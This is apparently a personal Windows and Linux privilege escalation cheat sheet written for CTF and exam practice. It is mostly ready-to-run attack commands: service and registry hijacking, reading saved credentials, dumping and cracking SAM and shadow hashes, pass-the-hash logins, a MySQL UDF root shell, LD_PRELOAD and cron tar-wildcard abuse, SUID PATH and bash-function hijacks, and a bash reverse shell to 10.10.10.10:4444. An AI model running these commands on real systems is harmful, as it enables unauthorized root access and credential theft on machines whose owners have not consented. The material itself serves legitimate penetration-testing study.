# Privilege Escalation

### For Windows Privilege Escalation Related Binaries and Instructions: [link me]()

### For Linux Privilege Escalation Related Binaries and Instructions: [link me]()

# Windows Methodology

For a more detailed windows privilege escalation methodology: [Windows-PrivEsc-Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

**Important windows privilege escalation related binaries:**
1. accesschk.exe 

  - downloadable link: `wget somewhere in misc/`
  - instructions: [link me](readme in misc/accesschk.exe)

### Services

***To query a service's configurations*** `sc qc <service-name>`

***To start or stop a service*** `net <start|stop> <service-name>`

1. Insecure service permissions
    - Description: if a user's permission is allowed to access and modify a service, such as SERVICE_CHANGE_CONFIG, we can change its binary path
    - Requirements: 
      - service must be running as LocalSystem 
      - SERVICE_CHANGE_CONFIG is within the permission of the user, or the group the user belongs to
      - ability to query the service configurations
      - ability to start and stop the service
    - Related instructions: 
      - accesschk parameters : `/accepteula -uvwqc` 
        - `c` is for service ACL check
      - sc command : `sc config <svc-name> binpath= "\"C:\path\to\service\binary\""` 
        - note the space between `=` and the binary path and the escaped quotes with `\`
      
2. Unquoted service paths
    - Description: if the binary to the service's path is not quoted and contain spaces, we can abuse Window's core functionality and create a binary in place that takes precedence. 
    - Requirements: 
       - service must be running as LocalSystem
       - ability to query service configurations
       - write access to **ANY** parent directories that happen after any spaces in the original binary path
       - ability to query the service configurations
       - ability to start and stop the service
    - Related instructions: 
       - accesschk parameters : `/accepteula -uvwqd` 
          - `d` is for directory ACL check
       
3.  Weak registry permissions
    - Description: if the service itself has a strong ACL, and we are unable to modify, if we have writable access to the service's registry entry, we can also change its binary path
    - Requirements: 
        - service must be running as LocalSystem 
        - write access to the service's registry entry under: `HKLM\SYSTEM\CurrentControlSet\services\servicename`
        - ability to query the service configurations
        - ability to start and stop the service
    - Related instructions: 
        - accesschk parameters : `/accepteula -uvwqk` 
          - `k` is for registry key ACL check
        - reg command : `reg add HKLM\SYSETM\CurrentControlSet\services\servicename /v ImagePath /t REG_EXPAND_SZ /d C:\Malicious\path /f`
          - `/v ImagePath`: specifies ImagePath registry entry
          - `/t REG_EXPAND_SZ` : specifies expanded string registry entry type
          - `/d C:\Malicious\path` : specifies the data we want to put inside the registry entry
          - `/f` : forces execution without user interaction/confirmation
          
4. Insecure service executable 
    - Description: If the service binary executable itself is writable by us, we can simply change that to point a malicious path
    - Requirements: 
        - service must be running as LocalSystem
        - write access to the service's executable
        - ability to query the service configurations
        - ability to start and stop the service
    - Related instructions: 
        - accesschk parameters : `/accepteula -uvwqh` 
          - `h` is for file or printer share ACL check
        - copy parameter : `/Y`
          - `/Y` for no confirmation (usually needed to replace any existing file)
          
        
### Registry
1. AutoRuns
    - Description: If any of the program's path in the autorun is writable, we can modify it. Once admin logs back on, the modified program should run as admin
    - Requirements: 
        - any of the autorun program's binary path needs to be writeble
        - must restart system
        - must have admin log on to trigger the autorun program's privlege as Administrator
    - Related instructions: 
        - accesschk parameters: `/accepteula -uvwqh`
          - `h` is for file ACL check
        - reg command: `req query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
          - `query` is for querying a registry key, note `add` was used to add registry value to a key
        - copy parameters: `/Y` for replacing existing file without user confirmation

2. AlwaysIntallElevated
    - Description : If the configuration for always installing software/applications as an elevated user is turned on for current user and local machine, we can install a malicious software as System
    - Requirements : 
        - **BOTH** HKLM and HKCU settings in AlwaysInstallElevated Key under SOFTWARE\Policies\Microsoft\Windows\Installer must be turned on `0x1`
    - Related instructions : 
        - reg commands: 
            - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
            - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` `/v` is the registry entry name under a specific key 

3. Passwords
    - Description: If the registry of winlogon in HKLM is readable, and if the Administrator had saved logon password in it, we pwn the admin account
    - Requirements: 
        - winlogon needs to have the admin user credentials
    - Related instructions: 
        - query all registry inside HKLM/HKCU hive for password: `reg query <HKCU|HKLM> /f password /t REG_SZ /s`
          - note that admin passwords should be stored inside `HKLM` unless current user is also admin
          - `/f` search pattern
          - `/t` type of registry value
          - `/s` query recursively
         - query specific autologon key: `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

### Password Management
1. Registry : Please see the last entry of the Privesc methodology of Registry [Registry-passwords](https://github.com/0x5929/Sec/blob/main/PrivEsc/README#L101)
2. Saved Creds
    - Description: Some users, for the purpose of convenience, will save credentials inside `cmdkey`, then we may run commands as another user using the saved credentials using `runas /savedcred ...`
    - Requirements: 
      - credentials must be saved inside `cmdkey`
    - Related instructions: 
      - cmdkey command to retreive creds : `cmdkey /list`
      - runas command to run as another user: `runas /savedcred /user:admin C:\command\running\as\admin`
        - this assumes that the admin user had saved creds inside a smartcard and verfied by the `cmdkey /list` command
3. SAM & SYSTEM files
    - Description: 
        - SAM and SYSTEM files stores user credential hashes and their encryption keys respectively
        - if we can extract those files (usually from backup locations, since normally those files are locked) we can crack user credential hashes
        - backup locations we can look for : `C:\Windows\System32\config\RegBack` or `C:\Windows\repair`
    - Requirements: 
        - backup of SAM and SYSTEM files must be available and readable to be copied to a remote host for hash cracking 
    - Related instructions: 
        - extract hashes: `git clone https://github.com/Neohapsis/creddump7.git && apt install python-crypto && creddump7/pwdump.py SYSTEM SAM`
          - note that python2 is deprated and `apt install python-crypto` could cause issues if not already installed on testing machine
          - please google for a viable solution if that happens
        - finding hash methods : `hashcat -h | grep -i ntlm`
          - note that there could several hashing methods relating to ntlm, we want to crack a system/os hash here
        - cracking hashes : `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
        - logging in with admin password (there are many ways to do this as well, ie runas, or via powershell credential obj): `winexe -U 'admin%pass' //MACHINE_IP cmd.exe`

4. PTH
    - Description: Once retrevied the hash from creddump7, we can just pass the hash to login instead of even cracking it
      - note that logging in with hash from a linux box can be done with : `pth-winexe`
      - logging in with the password from a linux box can be done with : `winexe` 
      - both will require SMB 445 to be open as winexe uses that for RCE and remote shell      
    - Requirements: 
      - SAM and SYSTEM files credential hashes to be dumped
    - Related instructions: 
      - logging with hash: `pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe`
        - note that the hash **must** be the full `LM:NTLM` hash


### Scheduled Tasks

- Description: If we are able to find a scheduled task that is running as admin/system priv, and if we can write or append to it, we can have our commands run elevated
    - to check for current user scheduled tasks (this will also include microsoft scheduled tasks running as current user) : `schtasks /query /fo LIST /v`
        - `/fo` is format output
        - `/v` is verbose mode
    - note that this is not the best way to enumerate scheduled tasks, and that there are no easy way to enumerate them
        - look for clues inside:  
            - interesting directories: `C:\` `C:\Users\user` `C:\Program Files` etc...
- Requirements: 
    - scheduled task time condition (is it possible to elevate with the time given?)
    - write or append access to the script running as scheduled task
    

### Applications and Programs

- Description: like scheduled tasks, look inside interesting directories, find unrecognize programs, and searchploit to see if they are vulnerable
- Requirements: 
    - the application needs to be running as administrator or system, check with: `tasklist \v | findstr <program-name>`
    - if its a gui app, we **have to** have RDP access or physical access to exploit this condition

### Token Abuse

***For more detailed explanation of all potato exploits:*** 
[potato exploits explanation](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)

- Descriptions : Service accounts by Windows core functionality can impersonate as other accounts in order to do service specific tasks, if we are exploiting a service and achieved RCE, we can impersonate admin's token to launch a separate processing using that token
- Requirements : 
    - must have `SeImpersonatePrivilege` on
    - must have SMB (Hot potato) or RPC (Juicy and Rogue) services on for exploits. 
    
    
# Linux Methodology 


### Service Exploits
- Description: If a service is running as root, `ps -ef | grep root` and is vulnerable to exploits, we can get root simply by exploiting the service
    - *ie* Exploiting mysql service: if we can obtain admin/root credentials, and mysql is running `root` instead of `mysql`, we can apply User Defined Functions to run system commands
        - in order to get UDF, we need to upload a shared-object file to a specific folder that mysql looks when executing UDFs
            - The share object file needs to be compiled, its source contains the `system()` call
        - then we need to execute the following command using the UDF function inside a mysql instance that is running as root
            - `cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash`
        - next, exit out of mysql, and execute the bash with preserved privlege `/tmp/rootbash -p`
        
```
# compiling the share object file for UDF
# note the -fPIC flag is necessary for x64 systems

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```
# mysql commands to create the UDF
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

```


- Requirement: 
    - service must be running as root
    - must have root access to the service aka able to login using: `mysql -uroot`
    
- Related instructions: 
    - once the UDF is created, we can execute system commands using: `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
        - note that do_system is the UDF function name created in mysql, and the shared object file is used for this function execution

### Weak File Permissions

1. Readable `/etc/shadow`
    - Description: if the `/etc/shadow` file has insecure permissions, if we can read it, we can extract root hash to crack it
    - Requirements: 
        - `/etc/shadow` must be readable by the low priv user
        
    - Related instructions: 
        - to crack hash using john (note hashcat can do the same as well) `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
          - note, using hashcat would have been : `hashcat -m 1800 --force <hash> <wordlist>`
          
2. Writable `/etc/shadow`
    - Description: if the `/etc/shadow` file is writable, we can just replace the root hash with another password hash that we can create
        - note that for `/etc/shadow` most likely needs a a specific hashed format for this to work
        - using `mkpasswd` would work, remember to hash it using the sha512 
    - Requirements: 
        - `/etc/shadow` must be writable
        - `/etc/shadow` must be readable (preferred because we can extract and also verify hash method of the original `/etc/shadow` file
    - Related instructions: 
        - make a new password hash using mkpasswd: `mkpasswd -m sha-512 newpasswordhere`
       
3. Writable `/etc/passwd`
    - Description: `/etc/passwd` file takes precedence for password auth because of backward compatibility, if we can write to it, we can replace root password, or create a new root account
        - note that `/etc/passwd` will most likely take multiple different hashing methods (not too sure) but to be sure, try using `openssl passwd <password>`
        - `mkpasswd -m sha-512 <password>` works too in the few practice labs I have tried
        - also, appending to `/etc/passwd` works as well, with UID `0`, since linux can take muliitple user with same UID (different usernames)
    - Requirements: 
        - `/etc/passwd` must be writable 
    
### Sudo
1. Sudo Shell Escape Sequences
    - Description: if `sudo -l` doesn't require passwords, or that we know the low priv password to access `sudo -l` and there are commands that the low priv user is allowed to do as `root` or `sudo` group, then we may try and utlize these commands to launch a root shell
    - Requirements: 
      - `sudo -l` can be access either without password or with a low priv user password that we know
      - one of the commands can be found on [gtfoBins](https://gtfobins.github.io/)
        - even if its not, such as apache, we can try and abuse its certain functionalities to load configuration files to see the first line of any senstive files aka `/etc/shadow`
    - Related instructions: 
       - please refer to  [gtfoBins](https://gtfobins.github.io/) for detail instructions on sudo shell escape sequences
       
2. Sudo Environment Variables
    - Description: `sudo` can be configured to inherit environment variables from the user's environment. `LD_PRELOAD` and `LD_LIBRARY_PATH` are the most dangerous environment variables to inherit, if they are inherited by the `env_keep` option, we can abuse this to load our own library and or share object file that can execute as `sudo` privs
    - Requirements: 
        - sudo -l` can be access either without password or with a low priv user password that we know
        - `LD_PRELOAD` and `LD_LIBRARY_PATH` env variables must be inherited from the user's environment with the `env_keep` option inside the sudo file
    - Related instructions: 
        - compiling preload shared object file and setting it with the `sudo` command
        ```
        # note that -fPIC flag is needed for x64 systems
        gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
        sudo LD_PRELOAD=/tmp/preload.so program-name-here
        ```
        - finding out what a program uses for its linked libraries with ldd: `ldd /path/to/binary`
        - compiling a shared object library file and pointing the LD_LIBRARY_PATH to our shared object library file directory and running our command while setting the environment variable
        
        ```
        gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

        sudo LD_LIBRARY_PATH=/tmp apache2
        ```
    
### Cronjobs
1. File Permissions
    - Description: if there are crontabs (usually systemwide inside `/etc/crontab`) that are owned by root and writable to the low priv user, we can overwrite the cronjob to execute what we wwant as root (when the cronjob executes)
    - Requirements: 
        - must be a cronjob that is owned by root
        - the cronjob must run in a reasonable time (for CTF and exam purposes)
        - the cronjob must be writable by the low priv user account we are in
    - Related instructions: 
        - quick reverse shell using bash: `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
    
2. PATH Environment Variable
    - Description: crontab can also specify a PATH variable that each conrjob inherits and executes commands from, if the one of the PATH (from the beginning) is writable by low priv user, we can write a script inside that directory to execute before the actual command reaches
    - Requirements: 
      - must be a cronjob that is owned by root
      - the cronjob must run in a reasonable time (for CTF and exam purposes)
      - `cat /etc/crontab` must have a PATH that we have write access to, as well, and it needs to appear before the path where the actual command is supposed to live
    - Related instructions: 
      - remember that all cronjobs will need to be executable by all, or at least the owner of the cronjob: `chmod +x /new/path/to/cronjob`
      
3. Wildcards
    - Description : if a cronjob uses a command that uses a wildcard `*` as one of its arguments, we can abuse the command's arguments (if it has commandline arguments that can lead to RCE or a shell
    - Requirements : 
      - must be a cronjob that is owned by root
      - the cronjob must run in a reasonable time (for CTF and exam purposes)
      - the cronjob uses a command that uses a `*` wildcard as one of its commandline arguments
      - the command inside the cronjob can be abused by its commandline arugments for RCE
    - Related instructions : 
      - the command `tar` has a feature that allows users run commands as part of a checkpoint, for more info please see: [gtfoBins](https://gtfobins.github.io/)
      - to abuse `tar`'s checkpoint RCE feature, and to abuse the cronjob using a wildcard `*` as one of its arguments, create a file with the same name as the the commandline option for `tar` that will allow RCE    
      ```
      echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' > run
      
      touch /home/user/--checkpoint=1
      touch /home/user/--checkpoint-action=exec=run
      ```
         
         - `tar` arguments: `--checkpoint=1` : defines that there is a checkpoint before reading/archiving the first record: `1`
         - `tar` arguments: `--checkpoint-action=exec=run` : defines the action to do at each checkpoint, which is executing run (that lives in the same directory)

### SUID/GUID

Finding SUID/SGID exectuables in a system: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -printf '%f\t%p\t%u\t%g\t%M\n' | column -t`
    - `type f` : type file
    - `-a` : logical and operator
    - `-perm -u+s` : matching permission with **at least** SUID bit on, note that `u+s` matches exactly the permission, and is not at least like `-u+s`
    - `-perm -g+s` : same as above, but for SGID binaries
    - `printf '%f\t%p\t%u\t%g\t%M\n'`: format printing of filename, tab, full path, tab, user, tab, group, tab, permission, new line
    - `column -t` : formats output to a table
    
1. Known Exploits
    - Description: After finding all SUID and SGID executables, find ones that are out of place, `searchsploit` known exploits and exploit accordingly
    - Requirements: 
        - a vulnerable SUID/SGID binary within the versions tested with its existing version
    - Related instructions: 
        - searchsploit command: `searchsploit <keyword>`

2. Shared Object Injection
    - Description: if a SUID/SGID binary tries and fails to load a share object file during its execution, and we have write access to the directory where the so file is loaded, then we can inject our own so by creating one inside the directory its looking for in.
    - Requirements: 
        - the binary must be loading a shared object file , that we can either overwrite, or that it failed loading it and we have access to the so file's parent directory so we can create the shared object file
    - Related instructions: 
        - the strace command, to trace the system calls of a program: `strace /path/to/suid/binary 2>&1 | egrep -i "open|access|no such file"`
            - `2>&1` redirects error to output, so we can evalute with egrep after the pipe
            - `open|access|no such file` looking for system calls that are : `open` `access` `no such file` to find out what files the  binary tries to load and access, or fails to load/access because the file is not found

3. Environment Variables
    - Description: 
    
    When a command executes and if it executes another command, the second *should* be executed with full path, if not, we can specify the first (original) comamnd's path and place a malicious program in our path to be searched before any other paths. Every command the first command executes will search in our path and executes the malicious program before finding it in its intended path 
   
    - Requirements: 
        - SUID binary needs to be calling another command within its binary
        - the said command needs to be specified **without** its full path
        
    - Related instructions: 
        - checking the binary for its contents, looking for internal command executions: `strings /path/to/suid/binary`
        - note that we did not use the previous strace command, because it only looks for open/access system calls and unavailable library loading with the No such file or directory error. 
            - however, if we modify the command to `strace /path/to/suid/binary 2>&1 | egrep -i 'open|access|no such file|execve'` we might be able to find its internal calling witht he execve system call ( that is if it used execve and not another systemcall to execute system commands)
         - loading a malicious current directory that contains the malicious program to be run as the path: 
            - `PATH=.:$PATH /path/to/vuln/suid/binary`
            - make sure the malicious program has the exact same program name revealed by `strings` command so it can be used before the actual program is looked up in its actual directory path

4. Abusing shell features via exporting functio name: 
    - Description: 
    
     When a command executes and if it executes another command, the second *should* be executed with full path, if it is not, we can exploit it with the ways described above. But if it is, and depending on the bash version number, we may still be able to exploit it using a function definition within bash (version < 4.2-048), the function definition names can contain slashes, so we can rename the entire command path as our funciton name, which *will take precedence* before the actual command is looked up by its path
    - Requirements: 
      - a suid/sgid binary that contains an internal command calling (of system comamnds), verified by `strings` or `strace`
      - bash version < 4.2-048
    - Related instructions: 
      - checking the binary for its contents, looking for internal command executions: `strings /path/to/suid/binary`
      - setting function name as an internal command name with full path: 
          - `function /path/to/command { /bin/bash -p; }`
              - since we are exploit SUID programs, they should be root owned, and have elevated priv as it is executing, the `/bin/bash -p` will preserve calling program/user's privilege and will give us a root shell
          - export the function, so it will take precedence over any command called (bash intended internal feature)
              - `export -f /path/to/command`

5. Abusing shell features via debugging prompt
    - Description: 
    
    If a SUID program contains SUID/System logic (always a bad idea) and we have bash version < 4.4, we can set the program to its debugging mode, while resetting and changing its environment, to execute elevated commands inside the debugging prompt. 
    - Requirements:
        - SUID/SGID program **must** contain a logic in the order of: suid/sgid -> system (i wonder if this will work with execve too)
        - bash version < 4.4
    - Related instructions:
        - resetting environment, setting debug mode on and setting a debugging prompt with shell commands to be evlevated executed when the binary executes via system: 
            - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /path/to/vuln/suid`
                - `env -i` sets a modified environment while *i*gnoring parent shell's environment for a command to executes
                - `SHELLOPTS=xtrace` turning debug mode on
                - `PS4=$(commands)` Debugging prompt containing system commands to be executed as the command's priv, hence if the priv is elevated via SUID, PS4 would be executed with elevated privilege
                
### Password & Keys
1. History Files:
    - Description: When a user types directory into the terminal, it is all saved within its history files (therefore never a good idea to do that without a tty prompting for password), if we can view the history file, we can look for passwords
        - note that if a password is used for one program, lets try it for the system passwords, or other programs, we never know if the user is reusing its passwords
    
    - Requirements: 
        - `~/.bash_history` or other history files need to be readable by the low priv user
        - `~/.bash_history` or other history files must contain sensitive information
        
    - Related instructions: 
        - viewing all history files in user directory: `cat ~/.*history | less`

2. Configuration Files: 
    - Description: Configuration files are used by programs to automate startup and program configurations. Some config files contain authentication process, which they may store the credentials in the files themselves (that is why we should always secure configuration files) 
    - Requirements: 
        - configuration file is readable by user
        - configuratoin file contains senstive data
        
    - Related instructions: 
        - looking for sensitive data within a confiuration file: `cat /path/to/config/file | egrep -i 'pass(word)?|user(name)?|d(ata)?b(ase)?|email'`
    
3. SSH Keys: 
    - Description: SSH Private keys (unencrypted) can be used to log into SSH without a prompt for password. If ssh key is readable, we can just log in as a different user via ssh
 
    - Requirements: 
        - SSH key private key must be readable
        - SSH key must not be encrypted with a passphrase (if it is, we may need to decrypt it first
        - SSH host must be configured to allow key authenication (should be by default)
        
    - Related instructions: 
        - changing the permission to read/write by user only (some ssh host require that security permission in order to authenicate using ssh keys)
            - `chmod 600 ssh_key`
                - `0` no access 
                - `1` execute access
                - `2` write access
                - `4` read access
### NFS

   - Description: If a linux system contains exportable file system via NFS and that if the root_squash setting is disabled with `no_root_squash` anybody on the network who is root in their own system can act as root on the NFS
      - note although we are root, if we only execute a script as SUID, for security purposes the privileges are dropped, **SUID only works on binaries**
   - Requirements: 
      - there must be a NFS that is exported 
      - `no_root_squash` must be configured for the exported Network FileSystem
      
   - Related instructions: 
      - to view linux server's exported NFS (before initial foothold) : `showmount -e <target-ip>`
          - `-e` export list
      - to view linux server's exported NFS (after initial foothold): `cat /etc/exports`
          - note for `no_root_squash`
      - to further enumerate nfs (for versions allowed) (before initial foothold, port 111 rpc must be open for this: `rpcinfo -p <IP>`
      
      - to mount to the NFS using `mount`: `mount -t nfs -o rw,vers=2 host:/nfs/host/exported/file/directory /client/file/directory/to/mount`
          - `-t nfs` type mounted: nfs
          - `-o` options
          - `vers` version number
          - `host:/tmp` sample nfs server mount poinpt
          - `/tmp/nfs` sample nfs client mount point
      - to unmount a nfs file system: `umount -l /tmp/nfs`
          - `-l` lazy unmount
          - `/tmp/nfs` sample nfs client mount point
      - to check for system mount points: `df -h` Diskformat? humanreadable 
      
### Kernel Exploits

- Description: 

 When all else fails aka everything is done correctly on the system, no configuration, file, cron, suid, sudo, service, or nfs weaknesses. We may be able to elevate if the user did not properly update/patch the OS. We may run enumeration tools for exploit *suggestions* 
 
 *Please note that kernel exploits are not stable, very easily can crash the system, which will need a reboot to resolve.*

- Requirements: 
    - when all other priv esc technique fails
    - if we are talking about the famous dirty cow: kernel < 4.8.3 are vulnerable
      - note if host system is unable to compile and build any exploits, try it on kali (if same architecture)

- Related instructions: 
    - please see [linux-enumeration-scripts](linux-enumeration-scripts-exploit-suggester) 
